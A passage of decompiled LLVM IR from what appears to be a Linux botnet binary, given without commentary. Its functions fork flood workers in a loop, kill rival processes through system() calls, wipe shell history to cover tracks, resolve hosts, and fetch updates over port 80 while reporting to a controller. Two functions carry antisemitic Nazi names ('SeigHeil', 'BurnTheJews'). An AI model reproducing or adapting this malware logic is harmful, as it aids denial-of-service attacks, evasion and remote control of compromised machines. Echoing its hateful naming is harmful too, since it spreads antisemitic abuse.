  store i32 268491944, i32* @lr, align 4
  %v3_1000dca4 = call i32 @fcntl(i32 %v0_1000dc94, i32 4, i32 %v1_1000dc90)
  %v2_1000dcb8 = load i32, i32* %v1_1000dc40, align 16
  store i32 268491984, i32* @lr, align 4
  %v3_1000dccc = call i32 @connect(i32 %v2_1000dcb8, i32 %v2_1000d8a4, i32 16)
  %v4_1000dcd8 = icmp eq i32 %v3_1000dccc, -1
  br i1 %v4_1000dcd8, label %dec_label_pc_1000dce0, label %dec_label_pc_1000dd10

dec_label_pc_1000dce0:                            ; preds = %dec_label_pc_1000dc50
  %v0_1000dce0 = call i32 @__errno_location()
  %v1_1000dce8 = inttoptr i32 %v0_1000dce0 to i32*
  %v2_1000dce8 = load i32, i32* %v1_1000dce8, align 4
  %v3_1000dcec = icmp eq i32 %v2_1000dce8, 115
  br i1 %v3_1000dcec, label %dec_label_pc_1000dd10, label %dec_label_pc_1000dcf4

dec_label_pc_1000dcf4:                            ; preds = %dec_label_pc_1000dce0
  store i32 ptrtoint (i32* @global_var_1000dd0c.518 to i32), i32* @lr, align 4
  %v2_1000dd08 = call i32 @reset_ipstate(i32 %v2_1000d9d4, i32 %v1_1000d910)
  br label %dec_label_pc_1000eb98

dec_label_pc_1000dd10:                            ; preds = %dec_label_pc_1000dc50, %dec_label_pc_1000dce0
  %v3_1000dd28 = call i32 @advance_state(i32* nonnull %v1_1000dc40, i32 1)
  br label %dec_label_pc_1000eb98

dec_label_pc_1000eb98:                            ; preds = %dec_label_pc_1000dbbc, %dec_label_pc_1000da10, %dec_label_pc_1000dd10, %dec_label_pc_1000dcf4, %dec_label_pc_1000db40
  %v1_1000eb9c = add nuw nsw i32 %storemerge48, 1
  %v2_1000ebac = icmp slt i32 %v1_1000eb9c, %stack_var_-596.0
  br i1 %v2_1000ebac, label %dec_label_pc_1000d9c8, label %dec_label_pc_1000d9bc

dec_label_pc_1000ebb8:                            ; preds = %entry
  %v2_1000ebb8 = load i32, i32* %stack_var_-640, align 4
  store i32 %v2_1000ebb8, i32* @r11, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000eb9c, { 1, 0 }
  uselistorder i8 %v3_1000da20, { 1, 0 }
  uselistorder i32 %v2_1000d9d4, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 %storemerge48, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1000d9a4, { 1, 0 }
  uselistorder i32 %storemerge313, { 1, 0 }
  uselistorder i32 %v1_1000d910, { 4, 0, 1, 2, 5, 3, 6 }
  uselistorder i32 %stack_var_-596.0, { 2, 3, 1, 4, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @fcntl, { 9, 8, 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder i32 (i32)* @init_rand, { 12, 11, 10, 9, 8, 7, 6, 1, 0, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_1000eb98, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_1000dd10, { 1, 0 }
  uselistorder label %dec_label_pc_1000dbbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000da10, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d94c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d88c, { 1, 0 }
}

define i32 @SeigHeil(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268495876, i32* @lr, align 4
  %v0_1000ec00 = call i32 @fork()
  store i32 268495892, i32* @lr, align 4
  %v1_1000ec10 = call i32 @sysconf(i32 84)
  %v1_1000ec20 = mul i32 %v1_1000ec10, 64
  %v3_1000ec34 = icmp eq i32 %v0_1000ec00, 0
  br i1 %v3_1000ec34, label %dec_label_pc_1000ec4c, label %dec_label_pc_1000ec3c

dec_label_pc_1000ec3c:                            ; preds = %entry
  store i32 %v0_1000ec00, i32* @global_var_10045168.572, align 4
  br label %dec_label_pc_1000ec94

dec_label_pc_1000ec4c:                            ; preds = %entry
  %v2_1000ec8c2 = icmp sgt i32 %v1_1000ec10, 0
  br i1 %v2_1000ec8c2, label %dec_label_pc_1000ec68, label %dec_label_pc_1000ec94

dec_label_pc_1000ec68:                            ; preds = %dec_label_pc_1000ec4c, %dec_label_pc_1000ec68
  %storemerge15 = phi i32 [ %v1_1000ec7c, %dec_label_pc_1000ec68 ], [ 0, %dec_label_pc_1000ec4c ]
  %v4_1000ec74 = call i32 @BurnTheJews(i32 370, i32 %v1_1000ec20, i32 %arg1, i32 %v1_1000ec10)
  %v1_1000ec7c = add nuw nsw i32 %storemerge15, 1
  %v2_1000ec8c = icmp slt i32 %v1_1000ec7c, %v1_1000ec10
  br i1 %v2_1000ec8c, label %dec_label_pc_1000ec68, label %dec_label_pc_1000ec94

dec_label_pc_1000ec94:                            ; preds = %dec_label_pc_1000ec68, %dec_label_pc_1000ec4c, %dec_label_pc_1000ec3c
  %v0_1000eca8 = phi i32 [ %v1_1000ec10, %dec_label_pc_1000ec3c ], [ %v1_1000ec10, %dec_label_pc_1000ec4c ], [ %v4_1000ec74, %dec_label_pc_1000ec68 ]
  ret i32 %v0_1000eca8

; uselistorder directives
  uselistorder i32 %v1_1000ec7c, { 1, 0 }
  uselistorder i32 %v1_1000ec10, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 %v0_1000ec00, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec68, { 1, 0 }
}

define i32 @doScanner(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000ecd4 = icmp sgt i32 %arg3, 0
  br i1 %v2_1000ecd4, label %dec_label_pc_1000ecf8, label %dec_label_pc_1000ecdc

dec_label_pc_1000ecdc:                            ; preds = %entry
  %v6_1000ecf0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002bd64.573 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eeec

dec_label_pc_1000ecf8:                            ; preds = %entry
  %v1_1000ecfc = add i32 %arg4, 4
  %v1_1000ed00 = inttoptr i32 %v1_1000ecfc to i32*
  %v2_1000ed00 = load i32, i32* %v1_1000ed00, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002bd84.575 to i32), i32* @r4, align 4
  %v3_1000ed10 = inttoptr i32 %v2_1000ed00 to i8*
  %v4_1000ed10 = call i32 @__GI_strcoll(i8* %v3_1000ed10, i32 ptrtoint ([3 x i8]* @global_var_1002bd84.575 to i32))
  %v3_1000ed18 = icmp eq i32 %v4_1000ed10, 0
  br i1 %v3_1000ed18, label %dec_label_pc_1000ed48, label %dec_label_pc_1000ed20

dec_label_pc_1000ed20:                            ; preds = %dec_label_pc_1000ecf8
  %v2_1000ed28 = load i32, i32* %v1_1000ed00, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002bd88.576 to i32), i32* @r4, align 4
  %v3_1000ed38 = inttoptr i32 %v2_1000ed28 to i8*
  %v4_1000ed38 = call i32 @__GI_strcoll(i8* %v3_1000ed38, i32 ptrtoint ([3 x i8]* @global_var_1002bd88.576 to i32))
  %v3_1000ed40 = icmp eq i32 %v4_1000ed38, 0
  br i1 %v3_1000ed40, label %dec_label_pc_1000ed48, label %dec_label_pc_1000eddc

dec_label_pc_1000ed48:                            ; preds = %dec_label_pc_1000ed20, %dec_label_pc_1000ecf8
  %v3_1000ed4c = load i32, i32* @global_var_10045168.572, align 4
  %v3_1000ed50 = icmp eq i32 %v3_1000ed4c, 0
  br i1 %v3_1000ed50, label %dec_label_pc_1000ed58, label %dec_label_pc_1000edb8

dec_label_pc_1000ed58:                            ; preds = %dec_label_pc_1000ed48
  store i32 268496224, i32* @lr, align 4
  %v2_1000ed5c = call i32 @SeigHeil(i32 %arg1, i32 268697600)
  %v3_1000ed64 = load i32, i32* @global_var_10045168.572, align 4
  %v3_1000ed68 = icmp eq i32 %v3_1000ed64, 0
  %v3_1000ed98 = load i32, i32* @global_var_100451c4.545, align 4
  br i1 %v3_1000ed68, label %dec_label_pc_1000ed94, label %dec_label_pc_1000ed70

dec_label_pc_1000ed70:                            ; preds = %dec_label_pc_1000ed58
  %v6_1000ed8c = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_1002bd8c.577 to i32), i32 %v3_1000ed98, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eeec

dec_label_pc_1000ed94:                            ; preds = %dec_label_pc_1000ed58
  %v6_1000edb0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_1002bdb8.579 to i32), i32 %v3_1000ed98, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eeec

dec_label_pc_1000edb8:                            ; preds = %dec_label_pc_1000ed48
  %v3_1000edbc = load i32, i32* @global_var_100451c4.545, align 4
  %v6_1000edd4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_1002bdec.581 to i32), i32 %v3_1000edbc, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eeec

dec_label_pc_1000eddc:                            ; preds = %dec_label_pc_1000ed20
  %v2_1000ede4 = load i32, i32* %v1_1000ed00, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002be20.583 to i32), i32* @r4, align 4
  %v3_1000edf4 = inttoptr i32 %v2_1000ede4 to i8*
  %v4_1000edf4 = call i32 @__GI_strcoll(i8* %v3_1000edf4, i32 ptrtoint ([4 x i8]* @global_var_1002be20.583 to i32))
  %v3_1000edfc = icmp eq i32 %v4_1000edf4, 0
  br i1 %v3_1000edfc, label %dec_label_pc_1000ee2c, label %dec_label_pc_1000ee04

dec_label_pc_1000ee04:                            ; preds = %dec_label_pc_1000eddc
  %v2_1000ee0c = load i32, i32* %v1_1000ed00, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002be24.584 to i32), i32* @r4, align 4
  %v3_1000ee1c = inttoptr i32 %v2_1000ee0c to i8*
  %v4_1000ee1c = call i32 @__GI_strcoll(i8* %v3_1000ee1c, i32 ptrtoint ([4 x i8]* @global_var_1002be24.584 to i32))
  %v3_1000ee24 = icmp eq i32 %v4_1000ee1c, 0
  br i1 %v3_1000ee24, label %dec_label_pc_1000ee2c, label %dec_label_pc_1000eed4

dec_label_pc_1000ee2c:                            ; preds = %dec_label_pc_1000ee04, %dec_label_pc_1000eddc
  %v3_1000ee30 = load i32, i32* @global_var_10045168.572, align 4
  %v3_1000ee34 = icmp eq i32 %v3_1000ee30, 0
  br i1 %v3_1000ee34, label %dec_label_pc_1000eeb0, label %dec_label_pc_1000ee3c

dec_label_pc_1000ee3c:                            ; preds = %dec_label_pc_1000ee2c
  store i32 268496464, i32* @lr, align 4
  %v2_1000ee4c = call i32 @kill(i32 %v3_1000ee30, i32 9)
  %v3_1000ee54 = icmp eq i32 %v2_1000ee4c, 0
  %v3_1000ee60 = load i32, i32* @global_var_100451c4.545, align 4
  br i1 %v3_1000ee54, label %dec_label_pc_1000ee5c, label %dec_label_pc_1000ee8c

dec_label_pc_1000ee5c:                            ; preds = %dec_label_pc_1000ee3c
  %v6_1000ee78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([42 x i8]* @global_var_1002be28.585 to i32), i32 %v3_1000ee60, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 0, i32* @global_var_10045168.572, align 4
  br label %dec_label_pc_1000eeec

dec_label_pc_1000ee8c:                            ; preds = %dec_label_pc_1000ee3c
  %v6_1000eea8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_1002be54.586 to i32), i32 %v3_1000ee60, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eeec

dec_label_pc_1000eeb0:                            ; preds = %dec_label_pc_1000ee2c
  %v3_1000eeb4 = load i32, i32* @global_var_100451c4.545, align 4
  %v6_1000eecc = call i32 @Send(i32 %arg1, i32 ptrtoint ([47 x i8]* @global_var_1002be88.588 to i32), i32 %v3_1000eeb4, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eeec

dec_label_pc_1000eed4:                            ; preds = %dec_label_pc_1000ee04
  %v6_1000eee8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002bd64.573 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eeec

dec_label_pc_1000eeec:                            ; preds = %dec_label_pc_1000eeb0, %dec_label_pc_1000ee8c, %dec_label_pc_1000ee5c, %dec_label_pc_1000edb8, %dec_label_pc_1000ed94, %dec_label_pc_1000ed70, %dec_label_pc_1000ecdc, %dec_label_pc_1000eed4
  %v0_1000ef00 = phi i32 [ %v6_1000eecc, %dec_label_pc_1000eeb0 ], [ %v6_1000eea8, %dec_label_pc_1000ee8c ], [ %v6_1000ee78, %dec_label_pc_1000ee5c ], [ %v6_1000edd4, %dec_label_pc_1000edb8 ], [ %v6_1000edb0, %dec_label_pc_1000ed94 ], [ %v6_1000ed8c, %dec_label_pc_1000ed70 ], [ %v6_1000ecf0, %dec_label_pc_1000ecdc ], [ %v6_1000eee8, %dec_label_pc_1000eed4 ]
  ret i32 %v0_1000ef00

; uselistorder directives
  uselistorder i32 %v3_1000ee60, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 4, 3, 2, 5, 7, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000eeec, { 7, 0, 1, 2, 3, 4, 5, 6 }
}

define i32 @botkill() local_unnamed_addr {
entry:
  %stack_var_-548 = alloca i32, align 4
  store i32 268496672, i32* @lr, align 4
  %v0_1000ef1c = call i32 @fork()
  %v3_1000ef24 = icmp eq i32 %v0_1000ef1c, 0
  br i1 %v3_1000ef24, label %dec_label_pc_1000f008, label %dec_label_pc_1000ef2c.preheader

dec_label_pc_1000ef2c.preheader:                  ; preds = %entry
  %v2_1000efb0 = ptrtoint i32* %stack_var_-548 to i32
  br label %dec_label_pc_1000ef2c

dec_label_pc_1000ef2c:                            ; preds = %dec_label_pc_1000ef38, %dec_label_pc_1000ef2c.preheader
  br label %dec_label_pc_1000ef38

dec_label_pc_1000ef38:                            ; preds = %dec_label_pc_1000ef2c, %dec_label_pc_1000ef38
  %storemerge12 = phi i32 [ 0, %dec_label_pc_1000ef2c ], [ %v1_1000eff0, %dec_label_pc_1000ef38 ]
  store i32 %v2_1000efb0, i32* @r3, align 4
  store i32 268496856, i32* @lr, align 4
  %v1_1000efd4 = call i32 @sprintf(i32 %v2_1000efb0)
  store i32 ptrtoint ([3 x i8]* @global_var_1000efe4.705 to i32), i32* @lr, align 4
  %v1_1000efe0 = call i32 @system(i32 %v2_1000efb0)
  store i32 268496876, i32* @lr, align 4
  %v1_1000efe8 = call i32 @sleep(i32 1)
  %v1_1000eff0 = add nuw nsw i32 %storemerge12, 1
  %tmp9 = icmp ult i32 %v1_1000eff0, 114
  br i1 %tmp9, label %dec_label_pc_1000ef38, label %dec_label_pc_1000ef2c

dec_label_pc_1000f008:                            ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000efb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ef38, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000f024 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000f024, i32* %stack_var_-16, align 4
  %v5_1000f024 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v5_1000f024, i32* @r31, align 4
  store i32 268496964, i32* @lr, align 4
  %v2_1000f040 = call i32 @system(i32 ptrtoint ([22 x i8]* @global_var_1002bf34.706 to i32))
  store i32 268496976, i32* @lr, align 4
  %v2_1000f04c = call i32 @system(i32 ptrtoint ([29 x i8]* @global_var_1002bf4c.707 to i32))
  store i32 268496988, i32* @lr, align 4
  %v2_1000f058 = call i32 @system(i32 ptrtoint ([21 x i8]* @global_var_1002bf6c.708 to i32))
  ret i32 %v2_1000f058

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @dns2ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_1000f09c = call i32 @mfork(i32 %arg2)
  %v3_1000f0a4 = icmp eq i32 %v1_1000f09c, 0
  br i1 %v3_1000f0a4, label %dec_label_pc_1000f0ac, label %dec_label_pc_1000f15c

dec_label_pc_1000f0ac:                            ; preds = %entry
  %v3_1000f0b0 = icmp eq i32 %arg3, 1
  br i1 %v3_1000f0b0, label %dec_label_pc_1000f0b8, label %dec_label_pc_1000f13c

dec_label_pc_1000f0b8:                            ; preds = %dec_label_pc_1000f0ac
  %v1_1000f0bc = add i32 %arg4, 4
  %v1_1000f0c0 = inttoptr i32 %v1_1000f0bc to i32*
  %v2_1000f0c0 = load i32, i32* %v1_1000f0c0, align 4
  store i32 268497100, i32* @lr, align 4
  %v1_1000f0c8 = call i32 @__GI_gethostbyname(i32 %v2_1000f0c0)
  %v1_1000f0d0 = add i32 %v1_1000f0c8, 16
  %v2_1000f0d0 = inttoptr i32 %v1_1000f0d0 to i32*
  %v3_1000f0d0 = load i32, i32* %v2_1000f0d0, align 4
  %v1_1000f0d4 = inttoptr i32 %v3_1000f0d0 to i32*
  %v2_1000f0d4 = load i32, i32* %v1_1000f0d4, align 4
  %v1_1000f0dc = inttoptr i32 %v2_1000f0d4 to i32*
  %v2_1000f0dc = load i32, i32* %v1_1000f0dc, align 4
  store i32 %v2_1000f0dc, i32* %stack_var_-24, align 4
  store i32 268497136, i32* @lr, align 4
  %v3_1000f0ec = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-24, i32 %v2_1000f0d4)
  %v2_1000f0f4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v3_1000f0ec, i32* @r4, align 4
  store i32 268497160, i32* @lr, align 4
  %v3_1000f104 = call i32 @strncpy(i32 %v2_1000f0f4, i32 %v3_1000f0ec, i32 16)
  %v2_1000f110 = load i32, i32* %v1_1000f0c0, align 4
  %v7_1000f134 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002bf84.709 to i32), i32 %arg2, i32 %v2_1000f110)
  br label %dec_label_pc_1000f154

dec_label_pc_1000f13c:                            ; preds = %dec_label_pc_1000f0ac
  %v6_1000f150 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002bfa4.711 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000f154

dec_label_pc_1000f154:                            ; preds = %dec_label_pc_1000f0b8, %dec_label_pc_1000f13c
  %v0_1000f158 = call i32 @__GI_exit()
  br label %dec_label_pc_1000f15c

dec_label_pc_1000f15c:                            ; preds = %entry, %dec_label_pc_1000f154
  %v0_1000f170 = phi i32 [ %v1_1000f09c, %entry ], [ %v0_1000f158, %dec_label_pc_1000f154 ]
  ret i32 %v0_1000f170

; uselistorder directives
  uselistorder label %dec_label_pc_1000f15c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f154, { 1, 0 }
}

define i32 @update(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  %stack_var_-4136 = alloca i32, align 4
  %stack_var_-5160 = alloca i32, align 4
  %stack_var_-5168 = alloca i32, align 4
  %stack_var_-5172 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5264 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000f174 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000f174, i32* %stack_var_-5264, align 4
  store i32 268497312, i32* @lr, align 4
  %v0_1000f19c = call i32 @__libc_getpid()
  %v1_1000f1ac = call i32 @mfork(i32 %arg2)
  %v3_1000f1b4 = icmp eq i32 %v1_1000f1ac, 0
  br i1 %v3_1000f1b4, label %dec_label_pc_1000f1bc, label %dec_label_pc_1000fb24

dec_label_pc_1000f1bc:                            ; preds = %entry
  %v2_1000f1c0 = icmp sgt i32 %arg3, 1
  br i1 %v2_1000f1c0, label %dec_label_pc_1000f1e8, label %dec_label_pc_1000f1c8

dec_label_pc_1000f1c8:                            ; preds = %dec_label_pc_1000f1bc
  %v6_1000f1dc = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_1002bfc0.713 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000f1e4 = call i32 @__GI_exit()
  br label %dec_label_pc_1000f1e8

dec_label_pc_1000f1e8:                            ; preds = %dec_label_pc_1000f1bc, %dec_label_pc_1000f1c8
  store i32 268497400, i32* @lr, align 4
  %v3_1000f1f4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_1000f208 = icmp eq i32 %v3_1000f1f4, -1
  br i1 %v4_1000f208, label %dec_label_pc_1000f210, label %dec_label_pc_1000f230

dec_label_pc_1000f210:                            ; preds = %dec_label_pc_1000f1e8
  %v6_1000f224 = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_1002bfe8.716 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000f22c = call i32 @__GI_exit()
  br label %dec_label_pc_1000f230

dec_label_pc_1000f230:                            ; preds = %dec_label_pc_1000f1e8, %dec_label_pc_1000f210
  store i32 2, i32* %stack_var_-5176, align 4
  store i32 80, i32* @r3, align 4
  %v1_1000f23c = call i32 @htons(i32 80)
  %v1_1000f24c = add i32 %arg4, 4
  %v1_1000f250 = inttoptr i32 %v1_1000f24c to i32*
  %v2_1000f250 = load i32, i32* %v1_1000f250, align 4
  store i32 268497500, i32* @lr, align 4
  %v1_1000f258 = call i32 @inet_addr(i32 %v2_1000f250)
  %v4_1000f26c = icmp eq i32 %v1_1000f258, -1
  br i1 %v4_1000f26c, label %dec_label_pc_1000f274, label %dec_label_pc_1000f2f0

dec_label_pc_1000f274:                            ; preds = %dec_label_pc_1000f230
  %v2_1000f27c = load i32, i32* %v1_1000f250, align 4
  store i32 268497544, i32* @lr, align 4
  %v1_1000f284 = call i32 @__GI_gethostbyname(i32 %v2_1000f27c)
  %v3_1000f294 = icmp eq i32 %v1_1000f284, 0
  br i1 %v3_1000f294, label %dec_label_pc_1000f29c, label %dec_label_pc_1000f2bc

dec_label_pc_1000f29c:                            ; preds = %dec_label_pc_1000f274
  %v6_1000f2b0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a13c.43 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000f2b8 = call i32 @__GI_exit()
  br label %dec_label_pc_1000f2bc

dec_label_pc_1000f2bc:                            ; preds = %dec_label_pc_1000f274, %dec_label_pc_1000f29c
  %v2_1000f2c0 = ptrtoint i32* %stack_var_-5172 to i32
  %v1_1000f2c8 = add i32 %v1_1000f284, 16
  %v2_1000f2c8 = inttoptr i32 %v1_1000f2c8 to i32*
  %v3_1000f2c8 = load i32, i32* %v2_1000f2c8, align 4
  %v1_1000f2cc = inttoptr i32 %v3_1000f2c8 to i32*
  %v2_1000f2cc = load i32, i32* %v1_1000f2cc, align 4
  store i32 %v2_1000f2cc, i32* %r11.global-to-local, align 4
  %v1_1000f2d4 = add i32 %v1_1000f284, 12
  %v2_1000f2d4 = inttoptr i32 %v1_1000f2d4 to i32*
  %v3_1000f2d4 = load i32, i32* %v2_1000f2d4, align 4
  store i32 %v2_1000f2c0, i32* @r3, align 4
  store i32 %v2_1000f2cc, i32* @r4, align 4
  store i32 %v3_1000f2d4, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000f2ec.721 to i32), i32* @lr, align 4
  %v0_1000f2e8 = call i32 @memcpy()
  br label %dec_label_pc_1000f2f8

dec_label_pc_1000f2f0:                            ; preds = %dec_label_pc_1000f230
  store i32 %v1_1000f258, i32* %stack_var_-5172, align 4
  br label %dec_label_pc_1000f2f8

dec_label_pc_1000f2f8:                            ; preds = %dec_label_pc_1000f2bc, %dec_label_pc_1000f2f0
  %v2_1000f2f8.pre-phi = ptrtoint i32* %stack_var_-5176 to i32
  %v2_1000f2fc = ptrtoint i32* %stack_var_-5168 to i32
  store i32 %v2_1000f2fc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268497680, i32* @lr, align 4
  %v0_1000f30c = call i32 @__GI_memset()
  store i32 268497700, i32* @lr, align 4
  %v3_1000f320 = call i32 @connect(i32 %v3_1000f1f4, i32 %v2_1000f2f8.pre-phi, i32 16)
  %v3_1000f328 = icmp eq i32 %v3_1000f320, 0
  br i1 %v3_1000f328, label %dec_label_pc_1000f350, label %dec_label_pc_1000f330

dec_label_pc_1000f330:                            ; preds = %dec_label_pc_1000f2f8
  %v6_1000f344 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a164.47 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000f34c = call i32 @__GI_exit()
  br label %dec_label_pc_1000f350

dec_label_pc_1000f350:                            ; preds = %dec_label_pc_1000f2f8, %dec_label_pc_1000f330
  store i32 268497764, i32* @lr, align 4
  %v6_1000f360 = call i32 @popen(i32 ptrtoint ([11 x i8]* @global_var_1002c048.723 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_1000f370 = icmp eq i32 %v6_1000f360, 0
  br i1 %v3_1000f370, label %dec_label_pc_1000f3e0, label %dec_label_pc_1000f378

dec_label_pc_1000f378:                            ; preds = %dec_label_pc_1000f350
  %v2_1000f378 = ptrtoint i32* %stack_var_-5160 to i32
  store i32 %v2_1000f378, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268497804, i32* @lr, align 4
  %v0_1000f388 = call i32 @__GI_memset()
  store i32 268497824, i32* @lr, align 4
  %v3_1000f39c = call i32 @fgets(i32 %v2_1000f378, i32 1024, i32 %v6_1000f360)
  store i32 268497844, i32* @lr, align 4
  %v6_1000f3b0 = call i32 @strstr(i32 %v2_1000f378, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002c054.724, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_1000f3b8 = icmp ne i32 %v6_1000f3b0, 0
  %.19 = zext i1 %v3_1000f3b8 to i8
  store i32 ptrtoint (i32* @global_var_1000f3dc.725 to i32), i32* @lr, align 4
  %v1_1000f3d8 = call i32 @pclose(i32 %v6_1000f360)
  br label %dec_label_pc_1000f400.preheader

dec_label_pc_1000f3e0:                            ; preds = %dec_label_pc_1000f350
  br label %dec_label_pc_1000f400.preheader

dec_label_pc_1000f400.preheader:                  ; preds = %dec_label_pc_1000f378, %dec_label_pc_1000f3e0
  %stack_var_-5196.0.ph = phi i8 [ %.19, %dec_label_pc_1000f378 ], [ 0, %dec_label_pc_1000f3e0 ]
  %v1_1000f408 = add i32 %arg4, 8
  %v1_1000f40c = inttoptr i32 %v1_1000f408 to i32*
  br label %dec_label_pc_1000f400

dec_label_pc_1000f3f4:                            ; preds = %dec_label_pc_1000f424
  %v1_1000f3f8 = add i32 %storemerge11, 1
  br label %dec_label_pc_1000f400

dec_label_pc_1000f400:                            ; preds = %dec_label_pc_1000f400.preheader, %dec_label_pc_1000f3f4
  %storemerge11 = phi i32 [ %v1_1000f3f8, %dec_label_pc_1000f3f4 ], [ 0, %dec_label_pc_1000f400.preheader ]
  %v2_1000f40c = load i32, i32* %v1_1000f40c, align 4
  store i32 %v2_1000f40c, i32* @r3, align 4
  %v0_1000f414 = call i32 @__GI_strlen()
  %v2_1000f41c = icmp ult i32 %storemerge11, %v0_1000f414
  br i1 %v2_1000f41c, label %dec_label_pc_1000f424, label %dec_label_pc_1000f448

dec_label_pc_1000f424:                            ; preds = %dec_label_pc_1000f400
  %v2_1000f42c = load i32, i32* %v1_1000f40c, align 4
  %v2_1000f434 = add i32 %v2_1000f42c, %storemerge11
  %v1_1000f438 = inttoptr i32 %v2_1000f434 to i8*
  %v2_1000f438 = load i8, i8* %v1_1000f438, align 1
  %v3_1000f440 = icmp eq i8 %v2_1000f438, 58
  br i1 %v3_1000f440, label %dec_label_pc_1000f448, label %dec_label_pc_1000f3f4

dec_label_pc_1000f448:                            ; preds = %dec_label_pc_1000f424, %dec_label_pc_1000f400
  %v2_1000f450 = load i32, i32* %v1_1000f40c, align 4
  %v2_1000f458 = add i32 %v2_1000f450, %storemerge11
  %v3_1000f460 = inttoptr i32 %v2_1000f458 to i8*
  store i8 0, i8* %v3_1000f460, align 1
  %v3_1000f46c = icmp eq i8 %stack_var_-5196.0.ph, 0
  %v2_1000f490 = load i32, i32* %v1_1000f40c, align 4
  br i1 %v3_1000f46c, label %dec_label_pc_1000f488, label %dec_label_pc_1000f4a4

dec_label_pc_1000f488:                            ; preds = %dec_label_pc_1000f448
